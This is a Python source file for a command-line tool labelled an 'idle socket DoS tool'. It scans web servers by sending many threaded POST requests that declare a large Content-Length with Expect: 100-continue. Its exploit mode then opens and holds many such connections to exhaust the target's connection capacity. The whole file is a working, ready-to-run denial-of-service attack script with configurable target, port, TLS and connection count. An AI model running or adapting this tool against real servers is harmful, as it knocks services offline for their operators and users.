import argparse
import socket
import ssl
import threading
import time

# Renk kodları
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BLUE = "\033[94m"
RESET = "\033[0m"

def create_connection(host, port, use_tls=False):
    sock = socket.create_connection((host, port), timeout=5)
    if use_tls:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    return sock

def scan_target(host, port, use_tls, conn, wait_sec, verbose):
    print(f"{BLUE}[*] Scanning {host}:{port} with {conn} connections for {wait_sec}s each...{RESET}")
    results = []

    def worker(i):
        nonlocal results
        try:
            sock = create_connection(host, port, use_tls)
            req = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 100000\r\n"
                f"Expect: 100-continue\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            sock.sendall(req.encode())
            response = sock.recv(1024).decode(errors="ignore").strip()
            line = response.splitlines()[0] if response else "NO RESPONSE"

            if verbose:
                print(f"{BLUE}[{i}] Response: {line}{RESET}")

            results.append(line)

            start = time.time()
            time.sleep(wait_sec)
            try:
                sock.send(b"PING\r\n")
                duration = round(time.time() - start, 2)
                print(f"{YELLOW}[{i}] Connection alive for {duration} seconds.{RESET}")
            except:
                print(f"{RED}[{i}] Connection dropped before {wait_sec} seconds.{RESET}")

            try:
                sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            sock.close()
        except Exception as e:
            print(f"{RED}[{i}] Scan failed: {e}{RESET}")
            results.append("ERROR")

    threads = []
    for i in range(conn):
        t = threading.Thread(target=worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.02)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"{YELLOW}\n[!] Interrupted.{RESET}")
        return

    # Sonuç analizi
    success = [r for r in results if r.startswith("HTTP/1.1 100")]
    total = len([r for r in results if r != "ERROR"])

    if total > 0 and len(success) == total:
        print(f"\n{GREEN}[✓] Vulnerable! All {total}/{total} responses returned 100 Continue.{RESET}")
    else:
        print(f"\n{RED}[✗] Not vulnerable. {len(success)}/{total} returned 100 Continue.{RESET}")

def exploit_connection(id, host, port, use_tls, wait_sec, verbose):
    try:
        sock = create_connection(host, port, use_tls)
        req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 100000\r\n"
            f"Expect: 100-continue\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        sock.sendall(req.encode())
        _ = sock.recv(1024)

        if verbose:
            print(f"{BLUE}[{id}] Connection established, holding for {wait_sec}s...{RESET}")
        time.sleep(wait_sec)

        print(f"{GREEN}[{id}] Held connection for {wait_sec} seconds.{RESET}")

        try:
            sock.shutdown(socket.SHUT_RDWR)
        except:
            pass
        sock.close()

    except Exception as e:
        print(f"{RED}[{id}] Exploit failed: {e}{RESET}")

def exploit_target(host, port, use_tls, conn, wait_sec, verbose):
    print(f"{BLUE}[*] Exploiting {host}:{port} with {conn} connections for {wait_sec}s each...{RESET}")
    threads = []
    for i in range(conn):
        t = threading.Thread(
            target=exploit_connection,
            args=(i, host, port, use_tls, wait_sec, verbose),
            daemon=True
        )
        t.start()
        threads.append(t)
        time.sleep(0.02)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"{YELLOW}\n[!] Interrupted by user.{RESET}")

def main():
    parser = argparse.ArgumentParser(description="lowhold – idle socket DoS tool")
    parser.add_argument("--target", required=True, help="Target IP or domain")
    parser.add_argument("--port", type=int, default=443, help="Target port (default: 443)")
    parser.add_argument("--tls", action="store_true", help="Use TLS (HTTPS)")
    parser.add_argument("--conn", type=int, default=100, help="Number of connections")
    parser.add_argument("--time", type=int, default=5, help="How many seconds to hold each connection (default: 5)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--scan", action="store_true", help="Scan for vulnerability")
    parser.add_argument("--exploit", action="store_true", help="Exploit idle connection")

    args = parser.parse_args()

    if args.scan:
        scan_target(args.target, args.port, args.tls, args.conn, args.time, args.verbose)
    elif args.exploit:
        exploit_target(args.target, args.port, args.tls, args.conn, args.time, args.verbose)
    else:
        print(f"{YELLOW}[!] Please specify either --scan or --exploit.{RESET}")

if __name__ == "__main__":
    main()
